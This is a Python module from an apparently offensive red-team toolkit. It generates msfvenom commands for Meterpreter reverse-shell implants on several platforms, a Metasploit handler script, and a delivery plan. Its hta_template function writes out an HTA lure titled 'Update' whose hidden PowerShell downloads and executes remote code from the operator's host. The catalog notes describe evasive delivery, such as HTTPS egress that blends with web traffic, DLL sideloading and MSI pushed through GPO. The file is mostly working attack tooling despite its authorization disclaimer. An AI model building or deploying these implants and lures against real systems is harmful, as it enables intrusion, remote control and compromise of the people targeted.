"""Payload builders (weaponization / delivery).

These are *planners*: they emit msfvenom commands and small delivery templates
(HTA) an operator runs, or that a future C2 module hands to the team server.
Nothing is executed here, and everything stays behind engagement authorization.
"""

from __future__ import annotations

from typing import Dict, List, Optional

# Common staged/stageless payloads with a suggested output format.
CATALOG: List[Dict[str, str]] = [
    {"platform": "windows", "payload": "windows/x64/meterpreter/reverse_tcp",
     "format": "exe", "note": "classic staged Windows implant"},
    {"platform": "windows", "payload": "windows/x64/meterpreter/reverse_https",
     "format": "exe", "note": "HTTPS egress; blends with web traffic"},
    {"platform": "windows", "payload": "windows/x64/meterpreter/reverse_tcp",
     "format": "dll", "note": "DLL sideloading / rundll32"},
    {"platform": "windows", "payload": "windows/x64/meterpreter/reverse_tcp",
     "format": "msi", "note": "MSI delivery via GPO / Intune"},
    {"platform": "windows", "payload": "windows/x64/shell/reverse_tcp",
     "format": "raw", "note": "raw shellcode for a custom loader"},
    {"platform": "linux", "payload": "linux/x64/meterpreter/reverse_tcp",
     "format": "elf", "note": "Linux ELF implant"},
    {"platform": "macos", "payload": "osx/x64/meterpreter/reverse_tcp",
     "format": "macho", "note": "macOS Mach-O implant"},
]


def catalog() -> List[Dict[str, str]]:
    return list(CATALOG)


def msfvenom_command(lhost: str, lport: int,
                     payload: str = "windows/x64/meterpreter/reverse_tcp",
                     fmt: str = "exe", out: str = "payload.exe",
                     encoder: Optional[str] = None,
                     iterations: int = 1,
                     extra: Optional[List[str]] = None) -> List[str]:
    """Build an ``msfvenom`` command (does not run it)."""
    if not lhost or not lport:
        raise ValueError("lhost and lport are required")
    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
           "-f", fmt, "-o", out]
    if encoder:
        cmd += ["-e", encoder, "-i", str(int(iterations))]
    if extra:
        cmd += list(extra)
    return cmd


def handler_resource(lhost: str, lport: int,
                     payload: str = "windows/x64/meterpreter/reverse_tcp") -> str:
    """A ``msfconsole -r`` resource that starts the matching handler."""
    return (
        "use exploit/multi/handler\n"
        f"set PAYLOAD {payload}\n"
        f"set LHOST {lhost}\n"
        f"set LPORT {lport}\n"
        "set ExitOnSession false\n"
        "exploit -j\n"
    )


def hta_template(lhost: str, lport: int) -> str:
    """A minimal HTA shellcode-launcher template (delivery lure)."""
    return (
        "<html><head><title>Update</title>\n"
        "<HTA:APPLICATION ID=\"oApp\" WINDOWSTATE=\"minimize\"/></head>\n"
        "<script language=\"VBScript\">\n"
        "  Set sh = CreateObject(\"WScript.Shell\")\n"
        f"  sh.Run \"powershell -nop -w hidden -c "
        f"\\\"$c=New-Object Net.WebClient;$c.Headers.Add('x','x');"
        f"IEX($c.DownloadString('http://{lhost}:{lport}/a'))\\\"\", 0, false\n"
        "  window.close()\n"
        "</script></html>\n"
    )


def payload_plan(lhost: str, lport: int, output_dir: str = "payloads") -> Dict:
    """A small delivery plan: build commands + handler + an HTA lure."""
    builds = []
    for item in CATALOG:
        if item["platform"] != "windows":
            continue
        out = f"{output_dir}/implant.{item['format']}"
        builds.append({
            "note": item["note"],
            "command": msfvenom_command(lhost, lport, item["payload"],
                                        item["format"], out),
        })
    return {
        "builds": builds,
        "handler": handler_resource(lhost, lport).splitlines(),
        "hta_lure": hta_template(lhost, lport),
        "warning": "authorized engagements only; delivery/execution is the operator's call",
    }
